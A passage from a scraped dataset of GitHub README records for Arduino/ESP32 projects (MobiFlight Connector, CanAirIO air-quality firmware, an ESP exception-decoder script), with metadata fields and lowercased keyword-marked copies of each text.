LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.\nReadme\nWhat is this repository for?\nThis repository contains the code for the Mobiflight Project\nHow do I get set up?\nSummary of set up\nCheckout the code and open the MobiFlightConnector.sln project.\nConfiguration\nCompile with DEBUG option for development and debugging Compile with RELEASE option for release - this will also execute the release build scripts after compiling that package MobiFlight nicely.\nDependencies\nAll Dependecies are currently contained in the repository and not referenced dynamically from their repository\nCommandMessenger - Library for communication back and forth between PC and Arduino\nMobiflightConnector - The PC application for configuration and communication between Flightsim and Arduino\nMobiFlightUnitTests - The test suite for the MobiFlight Connector\nVersionInfo - A helper tool to detect the current release version, used during creation of Release Package\nHow to run tests\nRun the MobiFlightConnectorTest project for unit tests\nBuild release package instructions\nThe release package is generated automatically using a RELEASE-build POST BUILD STEP. The necessary program to \"sniff\" the current version is part of the solution.\nContribution guidelines\nTo be defined...\nWriting tests\nCode review\nOther guidelines\nGet more information\nLook at the wiki to check for further information\nWho do I talk to?\nSebastian", "link": "https://github.com/MobiFlight/MobiFlight-Connector", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "license\nmit license\ncopyright (c) 2016 mobiflight\npermission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the \"software\"), to deal in the software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the software, and to permit persons to whom the software is furnished to do so, subject to the following conditions:\nthe above copyright notice and this permission notice shall be included in all copies or substantial portions of the software.\nthe software is provided \"as is\", without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose and noninfringement. in no event shall the authors or copyright holders be liable for any claim, damages or other liability, whether in an action of contract, tort or otherwise, arising from, out of or in connection with the software or the use or other dealings in the software.\nreadme\nwhat is this repository for?\nthis repository contains the code for the mobiflight project\nhow do i get set up?\nsummary of set up\ncheckout the code and open the mobiflightconnector.sln project.\nconfiguration\ncompile with debug option for development and debugging compile with release option for release - this will also execute the release build scripts after compiling that package mobiflight nicely.\ndependencies\nall dependecies are currently contained in the repository and not referenced dynamically from their repository\ncommandmessenger - library for communication back and forth between pc and arduino\nmobiflightconnector - the pc application for configuration and communication between flightsim and arduino\nmobiflightunittests - the test suite for the mobiflight connector\nversioninfo - a helper -----> tool !!!  to detect the current release version, used during creation of release package\nhow to run tests\nrun the mobiflightconnectortest project for unit tests\nbuild release package instructions\nthe release package is generated automatically using a release-build post build step. the necessary program to \"sniff\" the current version is part of the solution.\ncontribution guidelines\nto be defined...\nwriting tests\ncode review\nother guidelines\nget more information\nlook at the wiki to check for further information\nwho do i talk to?\nsebastian", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000725, "year": null}, {"Unnamed: 0": 2779, "autor": 739, "date": null, "content": "CanAirIO firmware\nCitizen science project with mobile and fixed sensors for measuring air quality (PM 2.5 or CO2) using low-cost sensors and smartphones. Built with a ESP32 module board interfaced with an CanAirIO Android client app.\nFeatures\nSuper easy web installer, via Chrome or Edge\nMobile station (via Bluetooth LE for tag GPS variables)\nFixed station, (using only your WiFi)\nFast WiFi credentials provisioning via Bluetooth\nAutomatic firmware OTA updates (stable/testing channels)\nShare mobile tracks via mobile.canair.io or CanAirIO app\nHome Assistant integration, discovery and multisensor support\nShare your fixed station quickly via Anaire Cloud\nSeparated sensors layer for improve support of new sensors\nMultiple boards and sensors support with only one firmware\nBoards supported\nThe last release of CanAirIO Device supports the next boards:\nFirmware Name Boards supported Display Guide and schematics\nTTGO_TDISPLAY TTGO T-Display eTFT CanAirIO Bike\nTTGO_T7 TTGO T7, D1Mini, ** OLED 64x48 CanAirIO v2.1\nESP32DevKit ESP32DevKit, NodeMCU V3, ** OLED 128x64 HacksterIO\nTTGO_TQ TTGO TQ Builtin OLED TTGO_TQ board\nWEMOSOLED WemosOLED and similar boards OLED 128x64 ESP32 OLED board\nHELTEC ESP32 Heltec board OLED 128x64\n** is possible that the current firmware supports more boards and sensors. Also you can choose the sensor brand or type on the CanAirIO Android app.\nInstallation alternatives\nWe have different alternatives for load the current firmware. In order of complexity they are:\nVia CanAirIO Web Installer (RECOMMENDED)\nIf you already have a ESP32 board, you can test our CanAirIO firmware on one click, with our web installer:\nVia CanAirIO loader\nYou will able to install the last version of CanAirIO firmware with internet updates via a simple Arduino sketch that it will doing all for you, you only need to use the official Arduino IDE or Arduino Droid app for Android for load this simple sketch. Please follow the instructions here or follow the next YouTube video guide for Android OTG installation alternative.\nVia binaries\nYou can download the last firmware version in releases section. Download the last production release from assets section, for example:\nplease uncompress the zip file and connect your CanAirIO device to your USB and execute the next command for upload the firmware to your model board, for example to a TTGO_T7 board you should run the next commands:\nLinux and MacOSx\nunzip canairio_rev414_20190829.zip\ncd canairio_installer\n./install.sh canairio_TTGO_T7_rev839.bin\nNote: you need python2 or python3 with pyserial in your system.\nWindows\nPlease read the Espressif Uploader section in the main documentation for details to load the firmware via the oficial Espressif Download Tool in Windows.\nOTA WAN updates\nCanAirIO has two channels for remote OTA updates of your device, production channel and development channel. With that you don't need again install the firmware for any update, all here is automatic and you only need have WiFi enable on your device for receive this firmware updates.\nIf you want the last testing updates, please choose in the previous step the development firmware (zip file with dev name), and upload it to your board.\nOTA LAN alternative\nAfter USB binary installation, you will able to send OTA updates to any board supported, like this:\n./install.sh ota canairio_d1mini_rev414_20190829.bin\nAlso you can specify the IP address:\n./install.sh ota canairio_xxx.bin 192.168.1.10\nMore details and options of CanAirIO Installer here\nVia PlatformIO (Compiling on Linux, Mac or Windows)\nPlease install first PlatformIO open source ecosystem for IoT development compatible with Arduino IDE and its command line tools (Windows, MacOs and Linux). Also, you may need to install git in your system.\nFor the default board TTGO_TDISPLAY (CanAirIO Bike), clone and upload firmware via USB cable:\ngit clone https://github.com/kike-canaries/canairio_firmware\ncd canairio_firmware\npio run --target upload\nFor a specific firmware for example for a TTGO-T7 board, only change the last line for:\npio run -e TTGO_T7 --target upload\nBuilding Installer\nYou can build CanAirIO Installer zip package with all binaries of all board flavors running the next command:\n./build all && ./build installer\nThe directory output is in: releases/installer\nAlso the binaries flavors directory: releases/binaries/\nMore details and options of CanAirIO Installer here\nTroubleshooting\nIf you have some issues with Bluetooth library internals, or libraries issues, please upgrade all frameworks and tools on PlatformIO:\npio update\nsudo pio upgrade\npio lib update\nAnd maybe clean all caches:\npio run -t clean\nrm -rf .pio\nIf you want clear all ESP32 preferences and flash variables in your board, please execute before:\n./install.sh erase /dev/ttyUSB0\nSupporting the project\nIf you want to contribute to the code or documentation, consider posting a bug report, feature request or a pull request.\nWhen creating a pull request, we recommend that you do the following:\nClone the repository\nCreate a new branch for your fix or feature. For example, git checkout -b fix/my-fix or git checkout -b feat/my-feature.\nRun to any clang formatter if it is a code, for example using the vscode formatter. We are using Google style. More info here\nDocument the PR description or code will be great\nTarget your pull request to be merged with devel branch\nAlso you can consider make a donation, be a patron or buy a device:\nVia Ethereum:\n0x1779cD3b85b6D8Cf1A5886B2CF5C53a0E072C108\nBe a patron: Github Sponsors, LiberaPay\nBuy a device: CanAirIO Bike in Tindie\nInviting us a coffee: buymeacoffee, Sponsors\nNOTE: Supporting our Citizen Science Initiative many people be able to fight for air quality rights in many countries with this kind of problems. More info in CanAir.IO\nFor our supporters, patrons or donors, we will send the preview versions of our coming versions:\nCanAirIO CO2 and CanAirIO Mini box\nCanAirIO device HOWTO guide\nWe have some build guides with different alternatives, please visit our CanAirIO documentation.\nBuilding Guide\nSoldering Guide (some improvements)\nBox STL files\n** W A R N N I N G **\nThe full updated and last versions for all box versions, are in the official repository because it is more easy for handling the versions than Thingiverse. This page it is only a guide.\nTODO\nEnable/Disable APIs from App\nLocatitation settings via Bluetooth\nSensors manager is now a library (CanAirIO Sensorlib)\nAuto detection of PM sensors (see sensorlib doc)\nCO2 sensors in chart\nOTA updates (LAN and WAN) (dev/prod, see releases for details)\nMultiple variables in chart (C02,PM2.5,Hum,Temp,etc)\nMap of each recorded track in details\nInfluxDB schema (by geohashes)\nNew pax counter variable (People around the device)\nWiFi SSIDs scanner for have a choose list of it in the app\nPax counter disable/enable\nHome Assistant integration (with zero-config)\nAnaire cloud integration (Automatic time series of your station)\nSensor community alternativa for fixed stations\nAnonymous authentication", "link": "https://github.com/kike-canaries/canairio_firmware", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "canairio firmware\ncitizen science project with mobile and fixed sensors for measuring air quality (pm 2.5 or co2) using low-cost sensors and smartphones. built with a esp32 module board interfaced with an canairio android client app.\nfeatures\nsuper easy web installer, via chrome or edge\nmobile station (via bluetooth le for tag gps variables)\nfixed station, (using only your wifi)\nfast wifi credentials provisioning via bluetooth\nautomatic firmware ota updates (stable/testing channels)\nshare mobile tracks via mobile.canair.io or canairio app\nhome assistant integration, discovery and multisensor support\nshare your fixed station quickly via anaire cloud\nseparated sensors layer for improve support of new sensors\nmultiple boards and sensors support with only one firmware\nboards supported\nthe last release of canairio device supports the next boards:\nfirmware name boards supported display guide and schematics\nttgo_tdisplay ttgo t-display etft canairio bike\nttgo_t7 ttgo t7, d1mini, ** oled 64x48 canairio v2.1\nesp32devkit esp32devkit, nodemcu v3, ** oled 128x64 hacksterio\nttgo_tq ttgo tq builtin oled ttgo_tq board\nwemosoled wemosoled and similar boards oled 128x64 esp32 oled board\nheltec esp32 heltec board oled 128x64\n** is possible that the current firmware supports more boards and sensors. also you can choose the sensor brand or type on the canairio android app.\ninstallation alternatives\nwe have different alternatives for load the current firmware. in order of complexity they are:\nvia canairio web installer (recommended)\nif you already have a esp32 board, you can test our canairio firmware on one click, with our web installer:\nvia canairio loader\nyou will able to install the last version of canairio firmware with internet updates via a simple arduino sketch that it will doing all for you, you only need to use the official arduino ide or arduino droid app for android for load this simple sketch. please follow the instructions here or follow the next youtube video guide for android otg installation alternative.\nvia binaries\nyou can download the last firmware version in releases section. download the last production release from assets section, for example:\nplease uncompress the zip file and connect your canairio device to your usb and execute the next command for upload the firmware to your model board, for example to a ttgo_t7 board you should run the next commands:\nlinux and macosx\nunzip canairio_rev414_20190829.zip\ncd canairio_installer\n./install.sh canairio_ttgo_t7_rev839.bin\nnote: you need python2 or python3 with pyserial in your system.\nwindows\nplease read the espressif uploader section in the main documentation for details to load the firmware via the oficial espressif download -----> tool !!!  in windows.\nota wan updates\ncanairio has two channels for remote ota updates of your device, production channel and development channel. with that you don't need again install the firmware for any update, all here is automatic and you only need have wifi enable on your device for receive this firmware updates.\nif you want the last testing updates, please choose in the previous step the development firmware (zip file with dev name), and upload it to your board.\nota lan alternative\nafter usb binary installation, you will able to send ota updates to any board supported, like this:\n./install.sh ota canairio_d1mini_rev414_20190829.bin\nalso you can specify the ip address:\n./install.sh ota canairio_xxx.bin 192.168.1.10\nmore details and options of canairio installer here\nvia platformio (compiling on linux, mac or windows)\nplease install first platformio open source ecosystem for iot development compatible with arduino ide and its command line tools (windows, macos and linux). also, you may need to install git in your system.\nfor the default board ttgo_tdisplay (canairio bike), clone and upload firmware via usb cable:\ngit clone https://github.com/kike-canaries/canairio_firmware\ncd canairio_firmware\npio run --target upload\nfor a specific firmware for example for a ttgo-t7 board, only change the last line for:\npio run -e ttgo_t7 --target upload\nbuilding installer\nyou can build canairio installer zip package with all binaries of all board flavors running the next command:\n./build all && ./build installer\nthe directory output is in: releases/installer\nalso the binaries flavors directory: releases/binaries/\nmore details and options of canairio installer here\ntroubleshooting\nif you have some issues with bluetooth library internals, or libraries issues, please upgrade all frameworks and tools on platformio:\npio update\nsudo pio upgrade\npio lib update\nand maybe clean all caches:\npio run -t clean\nrm -rf .pio\nif you want clear all esp32 preferences and flash variables in your board, please execute before:\n./install.sh erase /dev/ttyusb0\nsupporting the project\nif you want to contribute to the code or documentation, consider posting a bug report, feature request or a pull request.\nwhen creating a pull request, we recommend that you do the following:\nclone the repository\ncreate a new branch for your fix or feature. for example, git checkout -b fix/my-fix or git checkout -b feat/my-feature.\nrun to any clang formatter if it is a code, for example using the vscode formatter. we are using google style. more info here\ndocument the pr description or code will be great\ntarget your pull request to be merged with devel branch\nalso you can consider make a donation, be a patron or buy a device:\nvia ethereum:\n0x1779cd3b85b6d8cf1a5886b2cf5c53a0e072c108\nbe a patron: github sponsors, liberapay\nbuy a device: canairio bike in tindie\ninviting us a coffee: buymeacoffee, sponsors\nnote: supporting our citizen science initiative many people be able to fight for air quality rights in many countries with this kind of problems. more info in canair.io\nfor our supporters, patrons or donors, we will send the preview versions of our coming versions:\ncanairio co2 and canairio mini box\ncanairio device howto guide\nwe have some build guides with different alternatives, please visit our canairio documentation.\nbuilding guide\nsoldering guide (some improvements)\nbox stl files\n** w a r n n i n g **\nthe full updated and last versions for all box versions, are in the official repository because it is more easy for handling the versions than thingiverse. this page it is only a guide.\ntodo\nenable/disable apis from app\nlocatitation settings via bluetooth\nsensors manager is now a library (canairio sensorlib)\nauto detection of pm sensors (see sensorlib doc)\nco2 sensors in chart\nota updates (lan and wan) (dev/prod, see releases for details)\nmultiple variables in chart (c02,pm2.5,hum,temp,etc)\nmap of each recorded track in details\ninfluxdb schema (by geohashes)\nnew pax counter variable (people around the device)\nwifi ssids scanner for have a choose list of it in the app\npax counter disable/enable\nhome assistant integration (with zero-config)\nanaire cloud integration (automatic time series of your station)\nsensor community alternativa for fixed stations\nanonymous authentication", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000739, "year": null}, {"Unnamed: 0": 2787, "autor": 747, "date": null, "content": "EspArduinoExceptionDecoder\nPython Script to decode ESP8266 Exceptions.\nLicense\nGPL 3.0\nUsage:\nusage: decoder.py [-h] [-p {ESP8266,ESP32}] [-t TOOL] -e ELF [-f] file\ndecode ESP Stacktraces.\npositional arguments:\nfile The file to read the exception data from ('-' for\nSTDIN)\noptional arguments:\n-h, --help show this help message and exit\n-p {ESP8266,ESP32}, --platform {ESP8266,ESP32}\nThe platform to decode from\n-t TOOL, --tool TOOL Path to the xtensa toolchain\n-e ELF, --elf ELF path to elf file\n-f, --full Print full stack dump\nThe tool is the path to your xtensa toolchain. If you use PlatformIO it should be ~/.platformio/packages/toolchain-xtensa for the ESP8266 and ~/.platformio/packages/toolchain-xtensa32 for the ESP32.\nThe elf path is the path to your built elf binary. On PlatformIO it is located at <project-dir>/.pioenvs/<environment-name>/firmware.elf.\nDependencies:\npython 3 or 2.7\nThe xtensa toolchain for your ESP\nExample:\nGiven you have the following stacktrace from the ESP:\nException (3):\nepc1=0x4022ca68 epc2=0x00000000 epc3=0x00000000 excvaddr=0x4026b579 depc=0x00000000\nctx: cont\nsp: 3fff2250 end: 3fff2590 offset: 01a0\n>>>stack>>>\n3fff23f0: 00000000 00000000 3fff5a50 4020d548\n3fff2400: 00000003 3fff13c4 3fff5a50 4020ea3c\n3fff2410: 3fff4bb4 00000066 00000000 40229598\n3fff2420: 3fff46dc 00000010 00000000 40229598\n3fff2430: 3fff0000 00000001 00000000 4020560d\n3fff2440: 3fff4c44 00000280 4020d04c 40229524\n3fff2450: 3fff4bb4 3fff24ec 4020d014 40229598\n3fff2460: 3fff5314 3fff24c0 00000000 40202b20\n3fff2470: 3fff5a50 00000001 00000000 40203b67\n3fff2480: 00010101 3f010101 3fff5a2c 40228d4c\n3fff2490: 3fff2432 00000001 3fff24c0 402013d2\n3fff24a0: 3fff59ec 3fff5a2c 00000000 3fff13c4\n3fff24b0: 3fff5a50 3fff24ec 00000000 4020ebfd\n3fff24c0: 3ffe98b0 00000000 000003e8 00008c1c\n3fff24d0: 00000000 00000000 3fff6174 0000000f\n3fff24e0: 00000000 3fff24ec 0000000a 3ffe9838\n3fff24f0: 3fff59d0 3fff5d64 00000800 40201864\n3fff2500: 3fff13c4 3fff2de0 3fff2de0 4022b498\n3fff2510: 3fff13c4 3fff2de0 00000000 4022b1de\n3fff2520: 3fff4bb4 feefeffe 4022a150 4022a4ec\n3fff2530: feefeffe feefeffe feefeffe feefeffe\n3fff2540: feefeffe feefeffe feefeffe feefeffe\n3fff2550: feefeffe feefeffe feefeffe feefeffe\n3fff2560: feefeffe feefeffe feefeffe 3fff1564\n3fff2570: 3fffdad0 00000000 3fff155c 40202cfc\n3fff2580: feefeffe feefeffe 3fff1570 40204eb0\n<<<stack<<<\nYou can dump it in a file called myStackTrace.txt and run the decode.py script:\n$ <...>/decoder.py -e .pioenvs/d1_mini/firmware.elf myStackTrace.txt1\nThis prints the processed stacktrace:\nException: 3 (LoadStoreError: Processor internal physical address or data error during load or store)\nepc1: 0x4022ca68: strcmp at /Users/igrokhotkov/e/newlib-xtensa/xtensa-lx106-elf/newlib/libc/machine/xtensa/../../../../.././newlib/libc/machine/xtensa/strcmp.S:470\nepc2: 0x00000000\nepc3: 0x00000000\nexcvaddr: 0x4026b579: chip_v6_unset_chanfreq at ??:?\ndepc: 0x00000000\nctx: cont\nsp: 0x3fff2250\nend: 0x3fff2590\noffset: 0x000001a0\nstack:\n0x4020d548: bool ArduinoJson::JsonObject::containsKey<__FlashStringHelper>(__FlashStringHelper const*) const at /home/jan/devel/MQTT433gateway/.piolibdeps/ArduinoJson_ID64/src/ArduinoJson/Serialization/JsonSerializerImpl.hpp:56\n0x4020ea3c: Settings::applyJson(ArduinoJson::JsonObject&) at /home/jan/devel/MQTT433gateway/.piolibdeps/ArduinoJson_ID64/src/ArduinoJson/Serialization/JsonSerializerImpl.hpp:56\n0x40229598: String::length() const at /home/jan/.platformio/packages/framework-arduinoespressif8266@src-31d658a59f41540201fc3726a1394910/cores/esp8266/WString.h:79\n\\-> inlined by: operator() at /home/jan/devel/MQTT433gateway/lib/Settings/Settings.cpp:67\n\\-> inlined by: _M_invoke at /home/jan/.platformio/packages/toolchain-xtensa/xtensa-lx106-elf/include/c++/4.8.2/functional:2057\n0x40229598: String::length() const at /home/jan/.platformio/packages/framework-arduinoespressif8266@src-31d658a59f41540201fc3726a1394910/cores/esp8266/WString.h:79\n\\-> inlined by: operator() at /home/jan/devel/MQTT433gateway/lib/Settings/Settings.cpp:67\n\\-> inlined by: _M_invoke at /home/jan/.platformio/packages/toolchain-xtensa/xtensa-lx106-elf/include/c++/4.8.2/functional:2057\n0x4020560d: spiffs_hydro_read at /home/jan/.platformio/packages/framework-arduinoespressif8266@src-31d658a59f41540201fc3726a1394910/cores/esp8266/spiffs/spiffs_hydrogen.c:1122\n\\-> inlined by: SPIFFS_read at /home/jan/.platformio/packages/framework-arduinoespressif8266@src-31d658a59f41540201fc3726a1394910/cores/esp8266/spiffs/spiffs_hydrogen.c:427\n0x4020d04c: std::_Function_base::_Base_manager<std::function<bool (unsigned short const&)> notZero<unsigned short>()::{lambda(unsigned short const&)#1}>::_M_manager(std::_Any_data&, std::_Function_base::_Base_manager<std::function<bool (unsigned short const&)> notZero<unsigned short>()::{lambda(unsigned short const&)#1}> const&, std::_Manager_operation) at /home/jan/devel/MQTT433gateway/.piolibdeps/ArduinoJson_ID64/src/ArduinoJson/Serialization/JsonSerializerImpl.hpp:56\n0x40229524: std::function<bool (unsigned short const&)> notZero<unsigned short>()::{lambda(unsigned short const&)#1}::operator()(unsigned short const&) const at /home/jan/devel/MQTT433gateway/lib/Settings/Settings.cpp:72\n\\-> inlined by: std::_Function_handler<bool (unsigned short const&), std::function<bool (unsigned short const&)> notZero<unsigned short>()::{lambda(unsigned short const&)#1}>::_M_invoke(std::_Any_data const&, unsigned short const&) at /home/jan/.platformio/packages/toolchain-xtensa/xtensa-lx106-elf/include/c++/4.8.2/functional:2057\n0x4020d014: _M_manager at /home/jan/devel/MQTT433gateway/.piolibdeps/ArduinoJson_ID64/src/ArduinoJson/Serialization/JsonSerializerImpl.hpp:56\n0x40229598: String::length() const at /home/jan/.platformio/packages/framework-arduinoespressif8266@src-31d658a59f41540201fc3726a1394910/cores/esp8266/WString.h:79\n\\-> inlined by: operator() at /home/jan/devel/MQTT433gateway/lib/Settings/Settings.cpp:67\n\\-> inlined by: _M_invoke at /home/jan/.platformio/packages/toolchain-xtensa/xtensa-lx106-elf/include/c++/4.8.2/functional:2057\n0x40202b20: operator delete(void*) at /home/jan/.platformio/packages/framework-arduinoespressif8266@src-31d658a59f41540201fc3726a1394910/cores/esp8266/abi.cpp:57\n0x40203b67: std::_Sp_counted_deleter<SPIFFSFileImpl*, std::__shared_ptr<SPIFFSFileImpl, (__gnu_cxx::_Lock_policy)0>::_Deleter<std::allocator<SPIFFSFileImpl> >, std::allocator<SPIFFSFileImpl>, (__gnu_cxx::_Lock_policy)0>::_M_destroy() at /home/jan/.platformio/packages/toolchain-xtensa/xtensa-lx106-elf/include/c++/4.8.2/bits/shared_ptr_base.h:357\n0x40228d4c: std::__shared_count<(__gnu_cxx::_Lock_policy)0>::~__shared_count() at /home/jan/.platformio/packages/framework-arduinoespressif8266@src-31d658a59f41540201fc3726a1394910/libraries/ESP8266mDNS/ESP8266mDNS.cpp:396\n0x402013d2: fs::File::close() at /home/jan/.platformio/packages/framework-arduinoespressif8266@src-31d658a59f41540201fc3726a1394910/cores/esp8266/FS.cpp:251\n0x4020ebfd: Settings::load() at /home/jan/devel/MQTT433gateway/.piolibdeps/ArduinoJson_ID64/src/ArduinoJson/Serialization/JsonSerializerImpl.hpp:56\n0x40201864: Print::println() at /home/jan/.platformio/packages/framework-arduinoespressif8266@src-31d658a59f41540201fc3726a1394910/cores/esp8266/Print.cpp:187\n0x4022b498: std::_Function_handler<void (Settings const&), void (*)(Settings const&)>::_M_invoke(std::_Any_data const&, Settings const&) at /home/jan/.platformio/packages/toolchain-xtensa/xtensa-lx106-elf/include/c++/4.8.2/functional:2069\n0x4022b1de: setup at /home/jan/devel/MQTT433gateway/src/MQTT433gateway.cpp:207\n0x4022a150: _M_manager at /home/jan/devel/MQTT433gateway/.piolibdeps/ArduinoJson_ID64/src/ArduinoJson/Serialization/JsonSerializerImpl.hpp:56\n0x4022a4ec: _M_invoke at /home/jan/devel/MQTT433gateway/.piolibdeps/ArduinoJson_ID64/src/ArduinoJson/Serialization/JsonSerializerImpl.hpp:56\n0x40202cfc: loop_wrapper at /home/jan/.platformio/packages/framework-arduinoespressif8266@src-31d658a59f41540201fc3726a1394910/cores/esp8266/core_esp8266_main.cpp:57\n0x40204eb0: cont_norm at cont.o:?\nAcknowledgement\nThis is heavily inspired by EspExceptionDecoder.", "link": "https://github.com/janLo/EspArduinoExceptionDecoder", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "esparduinoexceptiondecoder\npython script to decode esp8266 exceptions.\nlicense\ngpl 3.0\nusage:\nusage: decoder.py [-h] [-p {esp8266,esp32}] [-t -----> tool !!! ] -e elf [-f] file\ndecode esp stacktraces.\npositional arguments:\nfile the file to read the exception data from ('-' for\nstdin)\noptional arguments:\n-h, --help show this help message and exit\n-p {esp8266,esp32}, --platform {esp8266,esp32}\nthe platform to decode from\n-t tool, --tool tool path to the xtensa toolchain\n-e elf, --elf elf path to elf file\n-f, --full print full stack dump\nthe tool is the path to your xtensa toolchain. if you use platformio it should be ~/.platformio/packages/toolchain-xtensa for the esp8266 and ~/.platformio/packages/toolchain-xtensa32 for the esp32.\nthe elf path is the path to your built elf binary. on platformio it is located at <project-dir>/.pioenvs/<environment-name>/firmware.elf.\ndependencies:\npython 3 or 2.7\nthe xtensa toolchain for your esp\nexample:\ngiven you have the following stacktrace from the esp:\nexception (3):\nepc1=0x4022ca68 epc2=0x00000000 epc3=0x00000000 excvaddr=0x4026b579 depc=0x00000000\nctx: cont\nsp: 3fff2250 end: 3fff2590 offset: 01a0\n>>>stack>>>\n3fff23f0: 00000000 00000000 3fff5a50 4020d548\n3fff2400: 00000003 3fff13c4 3fff5a50 4020ea3c\n3fff2410: 3fff4bb4 00000066 00000000 40229598\n3fff2420: 3fff46dc 00000010 00000000 40229598\n3fff2430: 3fff0000 00000001 00000000 4020560d\n3fff2440: 3fff4c44 00000280 4020d04c 40229524\n3fff2450: 3fff4bb4 3fff24ec 4020d014 40229598\n3fff2460: 3fff5314 3fff24c0 00000000 40202b20\n3fff2470: 3fff5a50 00000001 00000000 40203b67\n3fff2480: 00010101 3f010101 3fff5a2c 40228d4c\n3fff2490: 3fff2432 00000001 3fff24c0 402013d2\n3fff24a0: 3fff59ec 3fff5a2c 00000000 3fff13c4\n3fff24b0: 3fff5a50 3fff24ec 00000000 4020ebfd\n3fff24c0: 3ffe98b0 00000000 000003e8 00008c1c\n3fff24d0: 00000000 00000000 3fff6174 0000000f\n3fff24e0: 00000000 3fff24ec 0000000a 3ffe9838\n3fff24f0: 3fff59d0 3fff5d64 00000800 40201864\n3fff2500: 3fff13c4 3fff2de0 3fff2de0 4022b498\n3fff2510: 3fff13c4 3fff2de0 00000000 4022b1de\n3fff2520: 3fff4bb4 feefeffe 4022a150 4022a4ec\n3fff2530: feefeffe feefeffe feefeffe feefeffe\n3fff2540: feefeffe feefeffe feefeffe feefeffe\n3fff2550: feefeffe feefeffe feefeffe feefeffe\n3fff2560: feefeffe feefeffe feefeffe 3fff1564\n3fff2570: 3fffdad0 00000000 3fff155c 40202cfc\n3fff2580: feefeffe feefeffe 3fff1570 40204eb0\n<<<stack<<<\nyou can dump it in a file called mystacktrace.txt and run the decode.py script:\n$ <...>/decoder.py -e .pioenvs/d1_mini/firmware.elf mystacktrace.txt1\nthis prints the processed stacktrace:\nexception: 3 (loadstoreerror: processor internal physical address or data error during load or store)\nepc1: 0x4022ca68: strcmp at /users/igrokhotkov/e/newlib-xtensa/xtensa-lx106-elf/newlib/libc/machine/xtensa/../../../../.././newlib/libc/machine/xtensa/strcmp.s:470\nepc2: 0x00000000\nepc3: 0x00000000\nexcvaddr: 0x4026b579: chip_v6_unset_chanfreq at ??:?\ndepc: 0x00000000\nctx: cont\nsp: 0x3fff2250\nend: 0x3fff2590\noffset: 0x000001a0\nstack:\n0x4020d548: bool arduinojson::jsonobject::containskey<__flashstringhelper>(__flashstringhelper const*) const at /home/jan/devel/mqtt433gateway/.piolibdeps/arduinojson_id64/src/arduinojson/serialization/jsonserializerimpl.hpp:56\n0x4020ea3c: settings::applyjson(arduinojson::jsonobject&) at /home/jan/devel/mqtt433gateway/.piolibdeps/arduinojson_id64/src/arduinojson/serialization/jsonserializerimpl.hpp:56\n0x40229598: string::length() const at /home/jan/.platformio/packages/framework-arduinoespressif8266@src-31d658a59f41540201fc3726a1394910/cores/esp8266/wstring.h:79\n\\-> inlined by: operator() at /home/jan/devel/mqtt433gateway/lib/settings/settings.cpp:67\n\\-> inlined by: _m_invoke at /home/jan/.platformio/packages/toolchain-xtensa/xtensa-lx106-elf/include/c++/4.8.2/functional:2057\n0x40229598: string::length() const at /home/jan/.platformio/packages/framework-arduinoespressif8266@src-31d658a59f41540201fc3726a1394910/cores/esp8266/wstring.h:79\n\\-> inlined by: operator() at /home/jan/devel/mqtt433gateway/lib/settings/settings.cpp:67\n\\-> inlined by: _m_invoke at /home/jan/.platformio/packages/toolchain-xtensa/xtensa-lx106-elf/include/c++/4.8.2/functional:2057\n0x4020560d: spiffs_hydro_read at /home/jan/.platformio/packages/framework-arduinoespressif8266@src-31d658a59f41540201fc3726a1394910/cores/esp8266/spiffs/spiffs_hydrogen.c:1122\n\\-> inlined by: spiffs_read at /home/jan/.platformio/packages/framework-arduinoespressif8266@src-31d658a59f41540201fc3726a1394910/cores/esp8266/spiffs/spiffs_hydrogen.c:427\n0x4020d04c: std::_function_base::_base_manager<std::function<bool (unsigned short const&)> notzero<unsigned short>()::{lambda(unsigned short const&)#1}>::_m_manager(std::_any_data&, std::_function_base::_base_manager<std::function<bool (unsigned short const&)> notzero<unsigned short>()::{lambda(unsigned short const&)#1}> const&, std::_manager_operation) at /home/jan/devel/mqtt433gateway/.piolibdeps/arduinojson_id64/src/arduinojson/serialization/jsonserializerimpl.hpp:56\n0x40229524: std::function<bool (unsigned short const&)> notzero<unsigned short>()::{lambda(unsigned short const&)#1}::operator()(unsigned short const&) const at /home/jan/devel/mqtt433gateway/lib/settings/settings.cpp:72\n\\-> inlined by: std::_function_handler<bool (unsigned short const&), std::function<bool (unsigned short const&)> notzero<unsigned short>()::{lambda(unsigned short const&)#1}>::_m_invoke(std::_any_data const&, unsigned short const&) at /home/jan/.platformio/packages/toolchain-xtensa/xtensa-lx106-elf/include/c++/4.8.2/functional:2057\n0x4020d014: _m_manager at /home/jan/devel/mqtt433gateway/.piolibdeps/arduinojson_id64/src/arduinojson/serialization/jsonserializerimpl.hpp:56\n0x40229598: string::length() const at /home/jan/.platformio/packages/framework-arduinoespressif8266@src-31d658a59f41540201fc3726a1394910/cores/esp8266/wstring.h:79\n\\-> inlined by: operator() at /home/jan/devel/mqtt433gateway/lib/settings/settings.cpp:67\n\\-> inlined by: _m_invoke at /home/jan/.platformio/packages/toolchain-xtensa/xtensa-lx106-elf/include/c++/4.8.2/functional:2057\n0x40202b20: operator delete(void*) at /home/jan/.platformio/packages/framework-arduinoespressif8266@src-31d658a59f41540201fc3726a1394910/cores/esp8266/abi.cpp:57\n0x40203b67: std::_sp_counted_deleter<spiffsfileimpl*, std::__shared_ptr<spiffsfileimpl, (__gnu_cxx::_lock_policy)0>::_deleter<std::allocator<spiffsfileimpl> >, std::allocator<spiffsfileimpl>, (__gnu_cxx::_lock_policy)0>::_m_destroy() at /home/jan/.platformio/packages/toolchain-xtensa/xtensa-lx106-elf/include/c++/4.8.2/bits/shared_ptr_base.h:357\n0x40228d4c: std::__shared_count<(__gnu_cxx::_lock_policy)0>::~__shared_count() at 